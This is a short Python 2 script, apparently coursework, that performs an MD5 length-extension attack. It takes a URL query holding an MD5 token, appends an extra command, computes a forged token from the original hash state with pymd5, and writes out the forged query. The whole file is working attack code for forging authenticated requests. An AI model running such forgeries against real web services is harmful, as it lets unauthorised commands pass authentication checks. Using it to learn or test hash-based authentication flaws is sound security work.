#!/usr/bin/python

from pymd5 import padding, md5
import urllib
import sys


if len(sys.argv) != 4:
    print "argument number invalid"
    exit(0)

f = open(sys.argv[1], 'r')
query = f.read()
f.close()
f = open(sys.argv[2], 'r')
ex_command = f.read()
f.close()
output_file = sys.argv[3]

start = query.index("token=")
end = query.index("&user")
tk = query[start+6:end]
# print len(tk)
tk = tk.decode('hex')

frontURL = query[0:start+6]
endURL = query[end:len(query)]

h = md5(state = tk, count = 512);
h.update(ex_command)
mal_token = h.hexdigest();

result = frontURL + mal_token + endURL  + ex_command

print result

f = open(output_file, 'a+')
f.write(result)
f.close()
